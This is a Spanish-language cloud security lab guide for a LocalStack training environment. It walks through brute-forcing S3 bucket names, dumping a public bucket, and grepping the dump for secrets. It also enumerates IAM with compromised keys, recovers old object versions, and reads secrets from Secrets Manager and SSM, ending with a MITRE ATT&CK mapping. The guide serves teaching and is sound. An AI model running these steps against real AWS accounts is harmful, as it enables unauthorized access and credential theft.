# Lab 01 — S3 Misconfiguration & IAM Enumeration

## Objetivo

Identificar buckets S3 mal configurados, extraer datos sensibles expuestos y enumerar la configuración IAM de una cuenta AWS comprometida.

**Endpoint LocalStack:** `http://localstack:4566` (desde container) / `http://localhost:4566` (desde host)

---

## Parte 1 — Descubrimiento de Buckets S3

### Sin credenciales — Buckets públicos

```bash
# Verificar si un bucket existe y es público (sin autenticación)
curl -s http://labthinktank-public-data.s3.amazonaws.com/
curl -s http://localhost:4566/labthinktank-public-data/

# Con aws-cli sin credenciales
aws s3 ls s3://labthinktank-public-data --no-sign-request \
    --endpoint-url http://localhost:4566

# s3scanner — herramienta especializada en descubrir buckets públicos
s3scanner scan --buckets-file buckets.txt
```

### Fuerza bruta de nombres de buckets

```bash
# Generar lista de nombres probables para una empresa
company="labthinktank"
for suffix in data backup logs public files media assets code cdn; do
    echo "${company}-${suffix}"
    echo "${company}.${suffix}"
    echo "${suffix}.${company}"
done > buckets.txt

# Verificar existencia y acceso
while read bucket; do
    result=$(curl -s -o /dev/null -w "%{http_code}" \
        "http://localhost:4566/${bucket}/")
    [ "$result" != "404" ] && echo "[+] $bucket → HTTP $result"
done < buckets.txt
```

---

## Parte 2 — Explotar Bucket Público

```bash
# Listar contenido del bucket público
aws s3 ls s3://labthinktank-public-data \
    --endpoint-url http://localstack:4566

# Descargar todos los archivos
aws s3 sync s3://labthinktank-public-data /workspace/s3-dump/ \
    --endpoint-url http://localstack:4566

# Revisar archivos descargados
cat /workspace/s3-dump/employees.csv
cat /workspace/s3-dump/config.json

# Buscar secretos en los archivos
grep -rEi "password|secret|key|token|api" /workspace/s3-dump/
```

### Impacto de config.json expuesto

```json
{
  "db_host": "prod-db.labthinktank.internal",
  "db_user": "app_user",
  "db_password": "Prod@DB2026!",
  "api_key": "sk-prod-1234567890abcdef"
}
```

Con esta información: acceso directo a la base de datos de producción.

---

## Parte 3 — Enumeración IAM con credenciales comprometidas

Una vez obtenidas credenciales AWS (vía config.json, IMDS, git, etc.):

```bash
# Configurar credenciales
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1
ENDPOINT="--endpoint-url http://localstack:4566"

# Verificar identidad actual
aws sts get-caller-identity $ENDPOINT

# Listar usuarios IAM
aws iam list-users $ENDPOINT

# Listar roles
aws iam list-roles $ENDPOINT | python3 -m json.tool

# Políticas del usuario actual
aws iam list-attached-user-policies --user-name dev-deploy $ENDPOINT
aws iam list-user-policies --user-name dev-deploy $ENDPOINT

# Ver política en detalle
aws iam get-user-policy --user-name dev-deploy \
    --policy-name POLICY_NAME $ENDPOINT

# Grupos del usuario
aws iam list-groups-for-user --user-name dev-deploy $ENDPOINT
```

---

## Parte 4 — Auditoría de configuraciones S3

```bash
# Verificar ACL de un bucket
aws s3api get-bucket-acl \
    --bucket labthinktank-public-data \
    $ENDPOINT

# Verificar política de bucket
aws s3api get-bucket-policy \
    --bucket labthinktank-public-data \
    $ENDPOINT 2>/dev/null || echo "Sin bucket policy"

# Verificar block public access settings
aws s3api get-public-access-block \
    --bucket labthinktank-public-data \
    $ENDPOINT 2>/dev/null || echo "Block Public Access no configurado"

# Verificar cifrado
aws s3api get-bucket-encryption \
    --bucket labthinktank-public-data \
    $ENDPOINT 2>/dev/null || echo "Sin cifrado configurado"

# Verificar logging
aws s3api get-bucket-logging \
    --bucket labthinktank-public-data \
    $ENDPOINT

# Verificar versionado
aws s3api get-bucket-versioning \
    --bucket labthinktank-code \
    $ENDPOINT
```

### Acceder a versiones anteriores de archivos

```bash
# Listar versiones de un objeto (puede revelar datos eliminados)
aws s3api list-object-versions \
    --bucket labthinktank-code \
    $ENDPOINT

# Descargar versión específica
aws s3api get-object \
    --bucket labthinktank-code \
    --key config.py \
    --version-id VERSION_ID \
    /tmp/old_config.py \
    $ENDPOINT
```

---

## Parte 5 — Secrets Manager y SSM

```bash
# Listar secretos
aws secretsmanager list-secrets $ENDPOINT

# Obtener valor de un secreto
aws secretsmanager get-secret-value \
    --secret-id prod/database/credentials \
    $ENDPOINT | python3 -m json.tool

# SSM Parameter Store
aws ssm describe-parameters $ENDPOINT
aws ssm get-parameter \
    --name /prod/app/db-password \
    --with-decryption \
    $ENDPOINT
```

---

## Actividades

1. Descubrir todos los buckets S3 del entorno LocalStack
2. Extraer y documentar toda la información sensible del bucket público
3. Enumerar usuarios, roles y políticas IAM con las credenciales `test`
4. Verificar qué secretos están almacenados en Secrets Manager
5. Documentar el impacto de cada hallazgo con una severidad (crítica/alta/media/baja)

---

## Mapeo MITRE ATT&CK Cloud

| Técnica | TTP |
|---------|-----|
| Cloud Storage Object Discovery | T1619 |
| Unsecured Credentials — Cloud Instance Metadata | T1552.005 |
| Account Discovery — Cloud Account | T1087.004 |
| Data from Cloud Storage | T1530 |
